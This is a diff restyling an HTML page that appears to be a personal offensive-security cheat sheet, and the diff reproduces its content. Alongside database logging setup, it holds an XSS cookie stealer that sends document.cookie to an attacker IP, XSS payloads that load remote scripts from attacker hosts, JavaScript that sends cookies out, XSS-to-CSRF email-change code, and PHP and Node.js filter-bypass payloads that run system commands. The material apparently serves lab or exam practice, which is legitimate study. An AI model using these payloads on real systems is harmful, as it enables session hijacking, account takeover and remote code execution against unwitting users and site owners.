@@ -22,7 +22,7 @@ permalink: /python-code-snippets/
     --accent: #fb923c;
     --accent-2: #ffffff;
     --code-bg: #050505;
-    --border: rgba(255,255,255,0.1);
+    --border: rgba(255,255,255,0.2);
   }
 
   /* Container and typography */
@@ -90,7 +90,7 @@ permalink: /python-code-snippets/
     padding: 14px;
     overflow: auto;
     margin: 14px 0;
-    border: 1px solid rgba(255,255,255,0.04);
+    border: 1px solid var(--border);
     box-shadow: inset 0 -10px 50px rgba(0,0,0,0.6);
     font-size: 0.95rem;
   }
@@ -169,33 +169,42 @@ permalink: /python-code-snippets/
   <p class="muted">Note: If you didn't find the postgresql.conf file, then just type <code class="kbd">$locate postgresql.conf</code> in a terminal</p>
 
   <p>Uncomment these fields:</p>
-  <ol>
-    <li><code class="inline">#log_directory = 'log'</code></li>
-    <li><code class="inline">#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'</code></li>
-  </ol>
+  <div class="panel">
+    <ol>
+      <li><code class="inline">#log_directory = 'log'</code></li>
+      <li><code class="inline">#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'</code></li>
+    </ol>
+  </div>
 
   <p>Change these fields values:</p>
-  <ol>
-    <li><code class="inline">#log_statement = 'none'</code> → <code class="inline">log_statement = 'all'</code></li>
-    <li><code class="inline">#logging_collector = off</code> → <code class="inline">logging_collector = on</code></li>
-    <li>Restart: <code class="kbd">sudo /etc/init.d/postgresql restart</code> or <code class="kbd">sudo service postgresql restart</code></li>
-    <li>Fire query in postgresql: <code class="inline">select 2+2</code>.</li>
-    <li>Find current log in <code class="inline">/var/lib/postgresql/10/main/log</code></li>
-  </ol>
+  <div class="panel">
+    <ol>
+      <li><code class="inline">#log_statement = 'none'</code> → <code class="inline">log_statement = 'all'</code></li>
+      <li><code class="inline">#logging_collector = off</code> → <code class="inline">logging_collector = on</code></li>
+      <li>Restart: <code class="kbd">sudo /etc/init.d/postgresql restart</code> or <code class="kbd">sudo service postgresql restart</code></li>
+      <li>Fire query in postgresql: <code class="inline">select 2+2</code>.</li>
+      <li>Find current log in <code class="inline">/var/lib/postgresql/10/main/log</code></li>
+    </ol>
+  </div>
 
   <h3 id="MySQL">MySQL</h3>
   <p>Login to the MySQL instance and check out the <code class="inline">general_log</code> and values, whether it is set to ON or OFF:</p>
-  <pre><code class="language-sql">show variables like '%log%';</code></pre>
+  <div class="panel">
+    <pre><code class="language-sql">show variables like '%log%';</code></pre>
+  </div>
 
   <p>If it's OFF, run as root:</p>
-  <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
+  <div class="panel">
+    <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
+  </div>
 
   <p>Then check <code class="inline">general_log_file</code> to find where logs are written.</p>
 
   <h2 id="Python-Code-Snippets">Python Code Snippets</h2>
 
   <h3 id="Starting-Template">Starting Template</h3>
-  <pre><code class="language-python">import requests
+  <div class="panel">
+    <pre><code class="language-python">import requests
 import string
 import re
 import threading
@@ -251,11 +260,13 @@ if __name__ == "__main__":
 
     username, password = register()
     usercookies = login(username, password) </code></pre>
+  </div>
 
   <hr />
 
   <h3 id="File-Upload">File Upload With Additional Parameters</h3>
-  <pre><code class="language-python">def uploadFile(phpsessid):
+  <div class="panel">
+    <pre><code class="language-python">def uploadFile(phpsessid):
 
     url = "http://10.100.102.73:80/item/updateItem.php"
 
@@ -289,11 +300,13 @@ if __name__ == "__main__":
     else:
         print("[-] File is not uploaded.")
     return filename</code></pre>
+  </div>
 
   <hr />
 
   <h3 id="HTTP-File-Server">HTTP File Server 1</h3>
-  <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
+  <div class="panel">
+    <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
 
 LHOST      = "10.0.0.1"
@@ -318,9 +331,11 @@ def start_web_server():
     threading.Thread(target=httpd.serve_forever).start()
 
 start_web_server()</code></pre>
+  </div>
 
   <h4>HTTP File Server 2</h4>
-  <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
+  <div class="panel">
+    <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
 import os
 
@@ -355,9 +370,11 @@ def start_web_server(host="192.168.45.249", port=80, directory="."):
     print(f"{success} Serving at {host}:{port}")
     threading.Thread(target=httpd.serve_forever, daemon=True).start()
     return httpd</code></pre>
+  </div>
 
   <h4>HTTP File Server 3</h4>
-  <pre><code class="language-python">import threading
+  <div class="panel">
+    <pre><code class="language-python">import threading
 import mimetypes
 
 HOST = '0.0.0.0'
@@ -429,9 +446,11 @@ server_thread.start()
 
 # Main program continues here (non-blocking)
 print(f"{success} File server started in background. Main program running...")</code></pre>
+  </div>
 
   <h3 id="XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
-  <pre><code class="language-python">def send_xss_payload():
+  <div class="panel">
+    <pre><code class="language-python">def send_xss_payload():
 
     payload = "&lt;script&gt;document.location='http://10.100.102.67:9001/?c='+document.cookie&lt;/script&gt;"
     data = {
@@ -481,6 +500,7 @@ def listen_for_cookies():
 
 send_xss_payload()
 listen_for_cookies()</code></pre>
+  </div>
 
   <hr />
 
@@ -507,55 +527,68 @@ listen_for_cookies()</code></pre>
 
   <h4 id="Search-for-Deserialization-Methods">Search for Deserialization Methods</h4>
   <p>Use code analysis tools (grep, IDE search, SonarQube) to find calls to the methods listed above.</p>
-  <pre><code class="language-bash">grep -r "readObject" .
+  <div class="panel">
+    <pre><code class="language-bash">grep -r "readObject" .
 grep -r "XStream\.fromXML" .
 grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
+  </div>
 
   <h4 id="Trace-Input-Sources">Trace Input Sources</h4>
   <p>Trace inputs to see if untrusted (network, file upload, request params) data flows into deserialization APIs.</p>
 
   <h4 id="Check-for-Validation-or-Whitelisting">Check for Validation or Whitelisting</h4>
   <p>Look for <code>ObjectInputFilter</code> or similar filters. Example:</p>
-  <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
+  <div class="panel">
+    <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
 ObjectInputStream ois = new ObjectInputStream(input);
 ois.setObjectInputFilter(filter);</code></pre>
+  </div>
 
   <h4 id="Inspect-Serializable-Classes">Inspect Serializable Classes</h4>
   <p>Find classes implementing <code>Serializable</code> or <code>Externalizable</code> and inspect special read/write hooks.</p>
 
   <h2 id="Regex-Cheetsheet">Regex Cheetsheet</h2>
   <p>Match a START and END delimeter in <code>r.text</code>:</p>
-  <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
+  <div class="panel">
+    <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
 print(match[1].strip())</code></pre>
+  </div>
 
   <p>Extract a cookie value from response headers:</p>
-  <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
+  <div class="panel">
+    <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 set_cookie = r.headers.get('Set-Cookie', '')
 match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
 print(match.group(1))</code></pre>
+  </div>
 
   <h2 id="XSS-Payloads">XSS Payloads</h2>
 
   <h3 id="Payload-1">Load External JavaScript</h3>
-  <ul>
-    <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
-    <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
-    <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-    <li><code>&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
-    <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
-  </ul>
+  <div class="panel">
+    <ul>
+      <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
+      <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
+      <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+      <li><code>&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
+      <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
+    </ul>
+  </div>
 
   <h3 id="Payload-2">Load Inline JavaScript</h3>
-  <ul>
-    <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-    <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
-    <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-    <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
-  </ul>
+  <div class="panel">
+    <ul>
+      <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+      <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
+      <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+      <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
+    </ul>
+  </div>
 
   <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
-  <pre><code class="language-javascript">var req = new XMLHttpRequest();
+  <div class="panel">
+    <pre><code class="language-javascript">var req = new XMLHttpRequest();
 req.onload = handleResponse;
 req.open('get','/my-account',true);
 req.send();
@@ -565,9 +598,11 @@ function handleResponse() {
     changeReq.open('post', '/my-account/change-email', true);
     changeReq.send('csrf='+token+'&email=test@test.com')
 };</code></pre>
+  </div>
 
   <h3 id="XSS-Cookies-Stealer-js">Filter cookie & send</h3>
-  <pre><code class="language-javascript">function getCookieValue(name) {
+  <div class="panel">
+    <pre><code class="language-javascript">function getCookieValue(name) {
     const cookieString = document.cookie;
     const cookies = cookieString.split('; ');
     for (let cookie of cookies) {
@@ -582,14 +617,19 @@ const cookieValue = getCookieValue(cookieName);
 var req2 = new XMLHttpRequest();
 req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
 req2.send();</code></pre>
+  </div>
 
   <h2 id="Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</h2>
-  <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
+  <div class="panel">
+    <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
 (new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');</code></pre>
+  </div>
 
   <h2 id="Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</h2>
-  <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
+  <div class="panel">
+    <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
 (function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
+  </div>
 
   <h2 id="YSOSerial-Payload-Creation">YSOSerial</h2>
   <h3 id="NET-Version">.NET Version</h3>
